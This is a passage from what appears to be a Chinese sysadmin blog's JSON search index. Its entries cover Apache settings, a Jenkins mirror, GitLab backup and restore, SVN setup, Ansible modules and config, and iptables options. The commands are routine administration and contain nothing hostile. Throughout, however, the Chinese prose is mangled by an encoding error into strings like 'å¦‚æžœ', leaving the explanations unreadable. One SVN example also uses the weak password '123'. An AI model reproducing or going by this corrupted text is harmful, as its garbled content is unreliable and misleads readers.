â€œServer: Apache/2.4.29 (Unix) OpenSSL/1.0.1e-fips PHP/7.1.14â€³ ServerSignature Off å¦‚æœå°†æ­¤å€¼è®¾ç½®ä¸ºOnçš„è¯ï¼Œé‚£ä¹ˆå½“æ‰“å¼€æŸä¸ªä¸å­˜åœ¨æˆ–è€…å—é™åˆ¶çš„é¡µé¢æ—¶ï¼Œä¼šåœ¨é¡µé¢çš„å³ä¸‹è§’æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„apacheçš„ç‰ˆæœ¬å·ï¼Œè¿™ä¹Ÿæ˜¯éå¸¸å±é™©çš„ï¼Œå› æ­¤å»ºè®®è®¾ç½®ä¸ºOffå…³é—­ç‰ˆæœ¬ä¿¡æ¯æ˜¾ç¤ºã€‚ HostnameLookups Off è¡¨ç¤ºä»¥DNSæ¥æŸ¥è¯¢å®¢æˆ·ç«¯åœ°å€ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯Offå…³é—­çŠ¶æ€ï¼ŒåŠ¡å¿…ä¿æŒè¯¥è®¾ç½®ï¼Œæ‰“å¼€çš„è¯éå¸¸æ¶ˆè€—ç³»ç»Ÿèµ„æºã€‚ ","date":"2019-08-26 11:19","objectID":"/post/800/:2:0","tags":["apache"],"title":"apacheé…ç½®æ–‡ä»¶å¸¸ç”¨é…ç½®é¡¹è¯´æ˜","uri":"/post/800/"},{"categories":["devops"],"content":"æ¸…åé•œåƒåŠ é€Ÿåœ°å€ï¼š https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json è¿›å…¥æ’ä»¶ç®¡ç†â€”-\u003eé«˜çº§ ","date":"2019-08-22 04:20","objectID":"/post/795/:0:0","tags":["jenkins"],"title":"jenkinsåŠ é€Ÿ","uri":"/post/795/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¤‡ä»½ï¼š ä¿®æ”¹é»˜è®¤å­˜æ”¾å¤‡ä»½ç«™ç‚¹ç›®å½•ï¼Œç„¶åè¿›è¡Œé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ã€‚ vim /etc/gitlab/gitlab.rb gitlab_rails['backup_path'] = \"/data/gitlab/backups\" #ä¿®æ”¹å¤‡ä»½è·¯å¾„ gitlab_rails['backup_keep_time'] = 604800 #å¤‡ä»½ä¿ç•™7å¤© [root@gitlab-ce ~]# gitlab-ctl reconfigure 2)æ‰‹åŠ¨æ‰§è¡Œå¤‡ä»½å‘½ä»¤ï¼Œä¼šå°†å¤‡ä»½çš„ç»“æœå­˜å‚¨ è‡³/data/gitlab/backupsç›®å½•ä¸­ gitlab-rake gitlab:backup:create æ¢å¤gitlabæ•°æ®ï¼š åœæ­¢æ•°æ®å†™å…¥æœåŠ¡ gitlab-ctl stop unicorn gitlab-ctl stop sidekiq æ¢å¤æ•°æ®(ä¸éœ€è¦å¤‡ä»½çš„_gitlab_backup.tar) gitlab-rake gitlab:backup:restore BACKUP=1566444436_2019_08_21_12.0.3 å¯åŠ¨æœåŠ¡ gitlab-ctl start unicorn gitlab-ctl start sidekiq","date":"2019-08-22 03:45","objectID":"/post/797/:0:0","tags":["gitlab"],"title":"gitlabå¤‡ä»½æ¢å¤","uri":"/post/797/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¯åŠ¨æœåŠ¡ï¼š -dï¼šåå°å¯åŠ¨ -rï¼šé€’å½’ç›®å½• /opt/svn-repoï¼šé¡¹ç›®æ€»ç›®å½• svnserve -d -r /opt/svn-repo/ åˆ›å»ºé¡¹ç›®ï¼š svnadmin create /opt/svn-repo/é¡¹ç›®åç§° æ‹‰å–ä»£ç ï¼š svn checkout svn://ip/é¡¹ç›®åç§° è®¾ç½®é¡¹ç›®ç™»å½•æƒé™ â€œwrite\"ä¸ºå¯è¯»å¯å†™ï¼Œâ€œread\"ä¸ºåªè¯»ï¼Œâ€œnone\"è¡¨ç¤ºæ— è®¿é—®æƒé™ã€‚ 1.åœ¨svnæœåŠ¡å™¨çš„é¡¹ç›®ç›®å½•ä¸­ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¼€å¯ç™»å½•éªŒè¯ vimÂ /opt/svn-repo/é¡¹ç›®åç§°/conf/svnserve.conf [general] anon-access = none auth-access = write password-db = passwd authz-db = authz 2.æ·»åŠ ç”¨æˆ· vimÂ /opt/svn-repo/é¡¹ç›®åç§°/conf/passwd [users] # harry = harryssecret # sally = sallyssecret user1 = 123 3.è®¾ç½®ç”¨æˆ·æƒé™ [é¡¹ç›®åç§°:è·¯å¾„] ç”¨æˆ·å = æƒé™ [é¡¹ç›®åç§°:/] user1 = rw","date":"2019-08-15 21:25","objectID":"/post/791/:0:0","tags":["svn"],"title":"SVNå¸¸ç”¨çŸ¥è¯†","uri":"/post/791/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"æ–‡ç« è½¬è‡ªï¼šhttps://blog.51cto.com/liuzhengwei521/1962350 è¿‡æ»¤å‡ºæŒ‡å®šçš„ä¿¡æ¯ï¼š ansible all -m setup -a â€œfilter=ansible_os_familyâ€ ä¿¡æ¯è¯´æ˜ï¼š ansible_all_ipv4_addressesï¼šä»…æ˜¾ç¤ºipv4çš„ä¿¡æ¯ ansible_devicesï¼šä»…æ˜¾ç¤ºç£ç›˜è®¾å¤‡ä¿¡æ¯ ansible_distributionï¼šæ˜¾ç¤ºæ˜¯ä»€ä¹ˆç³»ç»Ÿï¼Œä¾‹ï¼šcentos,suseç­‰ ansible_distribution_major_versionï¼šæ˜¾ç¤ºæ˜¯ç³»ç»Ÿä¸»ç‰ˆæœ¬ ansible_distribution_versionï¼šä»…æ˜¾ç¤ºç³»ç»Ÿç‰ˆæœ¬ ansible_machineï¼šæ˜¾ç¤ºç³»ç»Ÿç±»å‹ï¼Œä¾‹ï¼š32ä½ï¼Œè¿˜æ˜¯64ä½ ansible_eth0ï¼šä»…æ˜¾ç¤ºeth0çš„ä¿¡æ¯ ansible_hostnameï¼šä»…æ˜¾ç¤ºä¸»æœºå ansible_kernelï¼šä»…æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬ ansible_lvmï¼šæ˜¾ç¤ºlvmç›¸å…³ä¿¡æ¯ ansible_memtotal_mbï¼šæ˜¾ç¤ºç³»ç»Ÿæ€»å†…å­˜ ansible_memfree_mbï¼šæ˜¾ç¤ºå¯ç”¨ç³»ç»Ÿå†…å­˜ ansible_memory_mbï¼šè¯¦ç»†æ˜¾ç¤ºå†…å­˜æƒ…å†µ ansible_swaptotal_mbï¼šæ˜¾ç¤ºæ€»çš„swapå†…å­˜ ansible_swapfree_mbï¼šæ˜¾ç¤ºswapå†…å­˜çš„å¯ç”¨å†…å­˜ ansible_mountsï¼šæ˜¾ç¤ºç³»ç»Ÿç£ç›˜æŒ‚è½½æƒ…å†µ ansible_processorï¼šæ˜¾ç¤ºcpuä¸ªæ•°(å…·ä½“æ˜¾ç¤ºæ¯ä¸ªcpuçš„å‹å·) ansible_processor_vcpusï¼šæ˜¾ç¤ºcpuä¸ªæ•°(åªæ˜¾ç¤ºæ€»çš„ä¸ªæ•°) ansible_python_versionï¼šæ˜¾ç¤ºpythonç‰ˆæœ¬ ","date":"2019-08-15 11:52","objectID":"/post/788/:0:0","tags":["ansible"],"title":"ansibleä¹‹setupæ¨¡å—å¸¸ç”¨çš„ä¿¡æ¯","uri":"/post/788/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"ansibleæ¨¡å—ä½¿ç”¨å®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.ansible.com/ansible/latest/modules/list_of_all_modules.html # commandæ¨¡å—å¸¸ç”¨é€‰é¡¹(é»˜è®¤æ¨¡å—ï¼Œæ­¤æ¨¡å—åªèƒ½æ‰§è¡Œä¸€äº›ç®€å•çš„å‘½ä»¤ï¼Œéœ€è¦ç›®æ ‡ä¸»æœºæ‹¥æœ‰pythonç¯å¢ƒ) createsï¼šä¸€ä¸ªæ–‡ä»¶åï¼Œå½“è¯¥æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¯¥å‘½ä»¤ä¸æ‰§è¡Œï¼Œåæ­£ï¼Œåˆ™æ‰§è¡Œã€‚ chdirï¼šåœ¨æ‰§è¡ŒæŒ‡ä»¤ä¹‹å‰ï¼Œå…ˆåˆ‡æ¢åˆ°è¯¥æŒ‡å®šçš„ç›®å½• removesï¼šä¸€ä¸ªæ–‡ä»¶åï¼Œå½“è¯¥æ–‡ä»¶å­˜åœ¨æ—¶ï¼Œåˆ™è¯¥é€‰é¡¹æ‰§è¡Œï¼Œåä¹‹ï¼Œä¸æ‰§è¡Œã€‚ ä¸¾ä¾‹ï¼š [root@m01 ~]# ansible all -m command -a \"hostname\" å› ä¸ºcommandæ˜¯é»˜è®¤æ¨¡å—ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥å†™æˆï¼š [root@m01 ~]# ansible all -a \"hostname\" #sshd.pidæ–‡ä»¶ä¸å­˜åœ¨æ‰§è¡Œservice start sshd,å­˜åœ¨å°±ä¸æ‰§è¡Œ [root@m01 ~]# ansible all -a 'creates=/run/sshd.pid service start sshd' #åˆ‡æ¢ç›®å½•ï¼Œç„¶ååœ¨æ‰§è¡Œpwd [root@m01 ~]# ansible all -m command -a \"chdir=/opt pwd\" # shellæ¨¡å—(ä½¿ç”¨æ–¹æ³•åŒcommandæ¨¡å—,éœ€è¦ç›®æ ‡ä¸»æœºæ‹¥æœ‰pythonç¯å¢ƒ) [root@m01 ~]# ansible all -m shell -a \"hostname \u003e\u003e /tmp/hostname.txt\" # rawæ¨¡å—ï¼ˆä½¿ç”¨æ–¹æ³•åŒcommandæ¨¡å—,ç›®æ ‡ä¸»æœºæ— éœ€æ‹¥æœ‰pythonç¯å¢ƒï¼‰ æ²¡æœ‰createsï¼Œchdirï¼Œremovesè¿™ä¸‰ä¸ªé€‰é¡¹ # scriptæ¨¡å—(è¿œç¨‹æ‰§è¡Œè„šæœ¬) #ç›´æ¥å†™æœ¬åœ°è„šæœ¬è·¯å¾„å³å¯ [root@m01 scripts]# ansible all -m script -a \"./yum.sh\" # fileæ¨¡å—(è®¾ç½®æ–‡ä»¶ç¬¦å·é“¾æ¥å’Œç›®å½•çš„å±æ€§ï¼Œæˆ–åˆ é™¤æ–‡ä»¶/ç¬¦å·é“¾æ¥/ç›®å½•) forceï¼šéœ€è¦åœ¨ä¸¤ç§æƒ…å†µä¸‹å¼ºåˆ¶åˆ›å»ºè½¯é“¾æ¥ï¼Œä¸€ç§æ˜¯æºæ–‡ä»¶ä¸å­˜åœ¨ä½†ä¹‹åä¼šå»ºç«‹çš„æƒ…å†µä¸‹ï¼›å¦ä¸€ç§æ˜¯ç›®æ ‡è½¯é“¾æ¥å·²å­˜åœ¨,éœ€è¦å…ˆå–æ¶ˆä¹‹å‰çš„è½¯é“¾ï¼Œç„¶ååˆ›å»ºæ–°çš„è½¯é“¾ï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼šyes|no groupï¼šå®šä¹‰æ–‡ä»¶/ç›®å½•çš„å±ç»„ modeï¼šå®šä¹‰æ–‡ä»¶/ç›®å½•çš„æƒé™ ownerï¼šå®šä¹‰æ–‡ä»¶/ç›®å½•çš„å±ä¸» pathï¼šå¿…é€‰é¡¹ï¼Œå®šä¹‰æ–‡ä»¶/ç›®å½•çš„è·¯å¾„ recurseï¼šé€’å½’çš„è®¾ç½®æ–‡ä»¶çš„å±æ€§ï¼Œåªå¯¹ç›®å½•æœ‰æ•ˆ yes | no srcï¼šè¦è¢«é“¾æ¥çš„æºæ–‡ä»¶çš„è·¯å¾„ï¼Œåªåº”ç”¨äºstate=linkçš„æƒ…å†µ destï¼šè¢«é“¾æ¥åˆ°çš„ç›®æ ‡è·¯å¾„ï¼Œåªåº”ç”¨äºstate=linkçš„æƒ…å†µ stateï¼š æœ‰å¦‚ä¸‹å‡ ä¸ªé€‰é¡¹ï¼š directoryï¼šè¡¨ç¤ºç›®å½•ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºç›®å½•ã€‚ linkï¼šåˆ›å»ºè½¯é“¾æ¥ hardï¼šåˆ›å»ºç¡¬é“¾æ¥ touchï¼šå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶æˆ–ç›®å½•å·²å­˜åœ¨ï¼Œåˆ™æ›´æ–°å…¶æœ€åä¿®æ”¹æ—¶é—´ absentï¼šåˆ é™¤ç›®å½•ã€æ–‡ä»¶æˆ–è€…å–æ¶ˆé“¾æ¥æ–‡ä»¶ã€‚ # åˆ›å»ºç›®å½• [root@m01 scripts]# ansible all -m file -a \"path=/root/soulchild state=directory\" #åœ¨rootç›®å½•ä¸‹åˆ›å»ºsoulchildç›®å½•ï¼Œè®¾ç½®æ‰€æœ‰è€…å’Œç»„ä¸ºnobodyï¼Œæƒé™ä¸º644ï¼Œé€’å½’è®¾ç½®æƒé™ [root@m01 scripts]# ansible all -m file -a 'path=/root/soulchild owner=nobody group=nobody mode=644 recurse=yes' # åˆ›å»ºè½¯è¿æ¥ [root@m01 scripts]# ansible all -m file -a \"src=/etc/hosts dest=/root/hosts state=link\" # copyæ¨¡å—(å°†æ–‡ä»¶ä»æœ¬åœ°å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœº) copyæ¨¡å—åŒ…å«å¦‚ä¸‹é€‰é¡¹ï¼š backupï¼šåœ¨è¦†ç›–ä¹‹å‰å°†åŸæ–‡ä»¶å¤‡ä»½ï¼Œå¤‡ä»½æ–‡ä»¶åŒ…å«æ—¶é—´ä¿¡æ¯ã€‚æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼šyes|no contentï¼šç”¨äºæ›¿ä»£â€srcâ€å‚æ•°,å¯ä»¥ç›´æ¥è®¾å®šæŒ‡å®šæ–‡ä»¶çš„å€¼ destï¼šå¿…é€‰é¡¹ã€‚è¦å°†æºæ–‡ä»¶å¤åˆ¶åˆ°çš„è¿œç¨‹ä¸»æœºçš„ç»å¯¹è·¯å¾„ï¼Œå¦‚æœæºæ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‚£ä¹ˆè¯¥è·¯å¾„ä¹Ÿå¿…é¡»æ˜¯ä¸ªç›®å½• directory_modeï¼šé€’å½’çš„è®¾å®šç›®å½•çš„æƒé™ï¼Œé»˜è®¤ä¸ºç³»ç»Ÿé»˜è®¤æƒé™ forceï¼šå¦‚æœç›®æ ‡ä¸»æœºåŒ…å«è¯¥æ–‡ä»¶ï¼Œä½†å†…å®¹ä¸åŒï¼Œå¦‚æœè®¾ç½®ä¸ºyesï¼Œåˆ™å¼ºåˆ¶è¦†ç›–ï¼Œå¦‚æœä¸ºnoï¼Œåˆ™åªæœ‰å½“ç›®æ ‡ä¸»æœºçš„ç›®æ ‡ä½ç½®ä¸å­˜åœ¨è¯¥æ–‡ä»¶æ—¶ï¼Œæ‰å¤åˆ¶ã€‚é»˜è®¤ä¸ºyes srcï¼šè¦å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶åœ¨æœ¬åœ°çš„åœ°å€ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœè·¯å¾„æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå®ƒå°†é€’å½’å¤åˆ¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœè·¯å¾„ä½¿ç”¨â€/â€æ¥ç»“å°¾ï¼Œåˆ™åªå¤åˆ¶ç›®å½•é‡Œçš„å†…å®¹ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨â€/â€æ¥ç»“å°¾ï¼Œåˆ™åŒ…å«ç›®å½•åœ¨å†…çš„æ•´ä¸ªå†…å®¹å…¨éƒ¨å¤åˆ¶ï¼Œç±»ä¼¼äºrsyncã€‚ validateï¼šå¤åˆ¶åˆ°ç›®æ ‡ä½ç½®ä¹‹å‰å…ˆè¿è¡Œçš„éªŒè¯å‘½ä»¤ã€‚è¦éªŒè¯çš„æ–‡ä»¶çš„è·¯å¾„é€šè¿‡â€œ%sâ€ä¼ å…¥ã€‚ä½¿ç”¨ï¼švalidate=â€˜visudo -cf %sâ€™ å…¶ä»–å‚æ•°ï¼šæ‰€æœ‰çš„fileæ¨¡å—é‡Œçš„é€‰é¡¹éƒ½å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨ #å°†æœ¬åœ°çš„show.shå‘é€åˆ°æ‰€æœ‰ä¸»æœºçš„/rootç›®å½•ä¸‹ [root@m01 ~]# ansible all -m copy -a \"src=/server/scripts/show.sh dest=/root\" #å°†æœ¬åœ°çš„show.shå‘é€åˆ°æ‰€æœ‰ä¸»æœºçš„/rootç›®å½•ä¸‹ï¼Œå¹¶è®¾ç½®æ‰€æœ‰è€…å’Œæƒé™ [root@m01 ~]# ansible all -m copy -a \"src=/server/scripts/show.sh dest=/root owner=nobody group=nobody mode=755\" # yumæ¨¡å—(å®‰è£…åˆ é™¤è½¯ä»¶åŒ…) name:è½¯ä»¶åŒ…çš„åç§° state: absent:åˆ é™¤è½¯ä»¶ installed:å®‰è£… latest:æ›´æ–° present:å®‰è£…ï¼ŒåŒinstalled(é»˜è®¤) removed:åˆ é™¤è½¯ä»¶ Â  æ‰¹é‡åˆ é™¤è½¯ä»¶ [root@m01 scripts]# ansible all -m yum -a â€œname=cowsay state=removedâ€ æ‰¹é‡å®‰è£…è½¯ä»¶ [root@m01 scripts]# ansible all -m yum -a â€œname=cowsay state=installedâ€ # cronæ¨¡å—(æ·»åŠ å®šæ—¶ä»»åŠ¡) minute:0-59 hour:0-23 day:1-31 month:1-12 weekday:0-6===\u003eå‘¨æ—¥-å‘¨å…­ å¯ä»¥ç”¨*ï¼ŒÂ /2è¿™ç§å½¢å¼ï¼Œä¸å†™ä¸º name:æè¿°ï¼Œæ·»åŠ ä»»åŠ¡éœ€è¦å¡«å†™(åˆ é™¤æ—¶æŒ‰ç…§æ¬¡åç§°åˆ é™¤) job:è¦æ‰§è¡Œçš„å‘½ä»¤ state: absent:åˆ é™¤ present:æ·»åŠ (é»˜è®¤) user:æŒ‡å®šæŒ‡å®šç”¨æˆ·ï¼Œé»˜è®¤ä¸ºroot æ¯å¤©00:00å¼€å§‹å¤‡ä»½etcç›®å½• [root@m01 scripts]# ansible all -m cron -a â€™name=â€œbackup etcâ€ minute=00 hour=00 job=â€œtar zcf /tmp/etc-date +%Y%m%d-%H%M.tar.gz /etc \u003e /dev/null 2\u003e\u00261â€ state=present' åˆ é™¤æŒ‡å®šä»»åŠ¡ [root@m01 scripts]# ansible all -m cron -a â€œname=â€˜backup etcâ€™ state=absentâ€ æ¯ä¸ªæ¨¡å—å®˜æ–¹éƒ½æœ‰æ›´è¯¦ç»†çš„ä¾‹å­å’Œä½¿ç”¨å‚æ•°ï¼Œè¿™é‡Œåªå†™ä¸€äº›ç®€å•çš„ä¸¾ä¾‹ ","date":"2019-08-12 17:30","objectID":"/post/239/:0:0","tags":["ansible"],"title":"ansibleå¸¸ç”¨æ¨¡å—çš„ç®€å•ä½¿ç”¨","uri":"/post/239/"},{"categories":["ansible"],"content":"ansibleå‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹ï¼š -m MODULE_NAMEï¼šæŒ‡å®šè¦æ‰§è¡Œçš„æ¨¡å—çš„åç§°ï¼Œå¦‚æœä¸æŒ‡å®š-mé€‰é¡¹ï¼Œé»˜è®¤æ˜¯COMMANDæ¨¡å—ã€‚ -a MODULE_ARGS,ï¼šæŒ‡å®šæ‰§è¡Œæ¨¡å—å¯¹åº”çš„å‚æ•°é€‰é¡¹ã€‚ -kï¼šæç¤ºè¾“å…¥SSHç™»å½•çš„å¯†ç è€Œä¸æ˜¯åŸºäºå¯†é’¥çš„éªŒè¯ -Kï¼šç”¨äºè¾“å…¥æ‰§è¡Œsuæˆ–sudoæ“ä½œæ—¶éœ€è¦çš„è®¤è¯å¯†ç ã€‚ -bï¼šè¡¨ç¤ºæå‡æƒé™æ“ä½œã€‚ â€“become-methodï¼šæŒ‡å®šæå‡æƒé™çš„æ–¹æ³•ï¼Œå¸¸ç”¨çš„æœ‰ sudoå’Œsuï¼Œé»˜è®¤æ˜¯sudoã€‚ â€“become-userï¼šæŒ‡å®šæ‰§è¡Œ sudoæˆ–suå‘½ä»¤æ—¶è¦åˆ‡æ¢åˆ°å“ªä¸ªç”¨æˆ·ä¸‹ï¼Œé»˜è®¤æ˜¯rootç”¨æˆ·ã€‚ -B ï¼šæŒ‡å®šä¸€ä¸ªæ—¶é—´ï¼Œå‘½ä»¤è¿è¡Œæ—¶é—´è¶…è¿‡æ—¶å°±ç»“æŸæ­¤å‘½ä»¤ -Cï¼šæµ‹è¯•ä¸€ä¸‹ä¼šæ”¹å˜ä»€ä¹ˆå†…å®¹ï¼Œä¸ä¼šçœŸæ­£å»æ‰§è¡Œï¼Œä¸»è¦ç”¨æ¥æµ‹è¯•ä¸€äº›å¯èƒ½å‘ç”Ÿçš„å˜åŒ– -f FORKS,ï¼šè®¾ç½®ansibleå¹¶è¡Œçš„ä»»åŠ¡æ•°ã€‚é»˜è®¤å€¼æ˜¯5 -i INVENTORYï¼š æŒ‡å®šä¸»æœºæ¸…å•æ–‡ä»¶çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º/etc/ansible/hostsã€‚ Ad-hocæ‰§è¡Œï¼š ansible ä¸»æœºæˆ–ç»„ -m æ¨¡å—åÂ -a â€˜æ¨¡å—å‚æ•°â€™Â ansibleå‚æ•° ä¸»æœºå’Œç»„ï¼šæ˜¯åœ¨/etc/ansible/hosts é‡Œè¿›è¡ŒæŒ‡å®šçš„éƒ¨åˆ†ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬ä»å¤–éƒ¨åº”ç”¨é‡Œè·å–çš„ä¸»æœºã€‚åŠ¨æ€Inventory(æ¸…å•) æ¨¡å—åï¼šå¯ä»¥é€šè¿‡ansible-doc -l æŸ¥çœ‹ç›®å‰å®‰è£…çš„æ¨¡å—ï¼Œé»˜è®¤ä¸æŒ‡å®šæ—¶ï¼Œä½¿ç”¨çš„æ˜¯commandæ¨¡å—ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹/etc/ansible/ansible.cfg çš„â€œ#module_name = command â€ éƒ¨åˆ†ï¼Œé»˜è®¤æ¨¡å—å¯ä»¥åœ¨è¯¥é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œä¿®æ”¹ï¼› æ¨¡å—å‚æ•°ï¼šå¯ä»¥é€šè¿‡ â€œansible-doc æ¨¡å—åâ€ æŸ¥çœ‹å…·ä½“çš„ç”¨æ³•åŠåé¢çš„å‚æ•°ï¼› ansibleå‚æ•°ï¼šå¯ä»¥é€šè¿‡ansibleå‘½ä»¤çš„å¸®å¿™ä¿¡æ¯é‡ŒæŸ¥çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šå‚æ•°å¯ä»¥ä¾›é€‰æ‹©ï¼Œå¦‚æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç ã€æ˜¯å¦sudoç­‰ã€‚ ","date":"2019-08-12 15:14","objectID":"/post/776/:0:0","tags":["ansible"],"title":"ansibleå‘½ä»¤å¸¸ç”¨å‚æ•°å’ŒAd-hocçš„ä½¿ç”¨æ ¼å¼","uri":"/post/776/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"/etc/ansible/ansible.cfg #inventory= /etc/ansible/hostsÂ è¯¥å‚æ•°è¡¨ç¤ºèµ„æºæ¸…å•inventoryæ–‡ä»¶çš„ä½ç½®ï¼Œèµ„æºæ¸…å•å°±æ˜¯ä¸€äº›Ansibleéœ€è¦è¿æ¥ç®¡ç†çš„ä¸»æœºåˆ—è¡¨ #library= /usr/share/my_modules/Â Ansibleçš„æ“ä½œåŠ¨ä½œï¼Œæ— è®ºæ˜¯æœ¬åœ°æˆ–è¿œç¨‹ï¼Œéƒ½ä½¿ç”¨ä¸€å°æ®µä»£ç æ¥æ‰§è¡Œï¼Œè¿™å°æ®µä»£ç ç§°ä¸ºæ¨¡å—ï¼Œè¿™ä¸ªlibraryå‚æ•°å°±æ˜¯æŒ‡å‘å­˜æ”¾Ansibleæ¨¡å—çš„ç›®å½• #remote_tmp= ~/.ansible/tmpÂ æŒ‡å®šè¿œç¨‹æ‰§è¡Œçš„è·¯å¾„ #local_tmp= ~/.ansible/tmpÂ ansibleç®¡ç†èŠ‚ç‚¹çš„æ‰§è¡Œè·¯å¾„ #forks= 5Â forks è®¾ç½®é»˜è®¤æƒ…å†µä¸‹Ansibleæœ€å¤šèƒ½æœ‰å¤šå°‘ä¸ªè¿›ç¨‹åŒæ—¶å·¥ä½œï¼Œé»˜è®¤è®¾ç½®æœ€å¤š5ä¸ªè¿›ç¨‹å¹¶è¡Œå¤„ç†ã€‚å…·ä½“éœ€è¦è®¾ç½®å¤šå°‘ä¸ªï¼Œå¯ä»¥æ ¹æ®æ§åˆ¶ä¸»æœºçš„æ€§èƒ½å’Œè¢«ç®¡ç†èŠ‚ç‚¹çš„æ•°é‡æ¥ç¡®å®šã€‚ #poll_interval= 15Â è½®è¯¢é—´éš” #sudo_user= rootÂ sudoä½¿ç”¨çš„é»˜è®¤ç”¨æˆ· ï¼Œé»˜è®¤æ˜¯root #ask_sudo_pass = TrueÂ æ˜¯å¦éœ€è¦ç”¨æˆ·è¾“å…¥sudoå¯†ç  #ask_pass= TrueÂ æ˜¯å¦éœ€è¦ç”¨æˆ·è¾“å…¥è¿æ¥å¯†ç  #remote_port= 22Â è¿™æ˜¯æŒ‡å®šè¿æ¥å¯¹ç«¯èŠ‚ç‚¹çš„ç®¡ç†ç«¯å£ï¼Œé»˜è®¤æ˜¯22ï¼Œé™¤éè®¾ç½®äº†ç‰¹æ®Šçš„SSHç«¯å£ï¼Œä¸ç„¶è¿™ä¸ªå‚æ•°ä¸€èˆ¬æ˜¯ä¸éœ€è¦ä¿®æ”¹çš„ #module_lang= CÂ è¿™æ˜¯é»˜è®¤æ¨¡å—å’Œç³»ç»Ÿä¹‹é—´é€šä¿¡çš„è®¡ç®—æœºè¯­è¨€,é»˜è®¤ä¸ºâ€™Câ€™è¯­è¨€. host_key_checking= FalseÂ è·³è¿‡sshé¦–æ¬¡è¿æ¥æç¤ºéªŒè¯éƒ¨åˆ†ï¼ŒFalseè¡¨ç¤ºè·³è¿‡ã€‚ #timeout= 10Â è¿æ¥è¶…æ—¶æ—¶é—´ #module_name= commandÂ æŒ‡å®šansibleé»˜è®¤çš„æ‰§è¡Œæ¨¡å— #nocolor= 1Â é»˜è®¤ansibleä¼šä¸ºè¾“å‡ºç»“æœåŠ ä¸Šé¢œè‰²,ç”¨æ¥æ›´å¥½çš„åŒºåˆ†çŠ¶æ€ä¿¡æ¯å’Œå¤±è´¥ä¿¡æ¯.å¦‚æœä½ æƒ³å…³é—­è¿™ä¸€åŠŸèƒ½,å¯ä»¥æŠŠâ€™nocolorâ€™è®¾ç½®ä¸ºâ€˜1â€™: #private_key_file=/path/to/file.pemÂ åœ¨ä½¿ç”¨sshå…¬é’¥ç§é’¥ç™»å½•ç³»ç»Ÿæ—¶å€™ï¼Œä½¿ç”¨çš„å¯†é’¥è·¯å¾„ã€‚ ","date":"2019-08-12 15:08","objectID":"/post/772/:0:0","tags":["ansible"],"title":"ansibleé…ç½®æ–‡ä»¶å‚æ•°å‚è€ƒ","uri":"/post/772/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‚æ•°è¯´æ˜ï¼š -t table ç”¨æ¥æŒ‡æ˜ä½¿ç”¨çš„è¡¨ï¼Œæœ‰ä¸‰ç§é€‰é¡¹: filterï¼Œnatï¼Œmangleã€‚è‹¥æœªæŒ‡å®šï¼Œåˆ™é»˜è®¤ä½¿ç”¨filterè¡¨ã€‚ command æŒ‡å®šiptables å¯¹æˆ‘ä»¬æäº¤çš„è§„åˆ™è¦åšä»€ä¹ˆæ ·çš„æ“ä½œã€‚å‘½ä»¤éƒ½éœ€è¦ä»¥chainä½œä¸ºå‚æ•°ã€‚ -P (--policy) å®šä¹‰é»˜è®¤ç­–ç•¥ã€‚ -L (--list) æŸ¥çœ‹è§„åˆ™åˆ—è¡¨ã€‚ -A (--append) åœ¨è§„åˆ™åˆ—è¡¨çš„æœ€åå¢åŠ è§„åˆ™ã€‚ -I (--insert) åœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥è§„åˆ™ã€‚ -D (--delete) ä»è§„åˆ™åˆ—è¡¨ä¸­åˆ é™¤è§„åˆ™ã€‚ -R (--replace) æ›¿æ¢è§„åˆ™åˆ—è¡¨ä¸­çš„æŸæ¡è§„åˆ™ã€‚ -F (--flush) æ¸…æ¥šæŒ‡å®šçš„è§„åˆ™ã€‚ -Z (--zero) å°†æŒ‡å®šé“¾ï¼ˆå¦‚æœªæŒ‡å®šï¼Œåˆ™è®¤ä¸ºæ˜¯æ‰€æœ‰é“¾ï¼‰çš„æ‰€æœ‰è®¡æ•°å™¨å½’é›¶ã€‚ -X (--delete-chain) åˆ é™¤æŒ‡å®šç”¨æˆ·è‡ªå®šä¹‰é“¾ã€‚ Â  ä¿®æ”¹é“¾çš„çŠ¶æ€ï¼š iptables -P INPUT DROP å¼€æ”¾æŒ‡å®šç«¯å£: iptables -A INPUT -s 0/0 -p tcp -m tcp â€“dport 22 -j ACCEPT åˆ é™¤è§„åˆ™ï¼š iptables -D INPUT -s 0/0 -p tcp -m 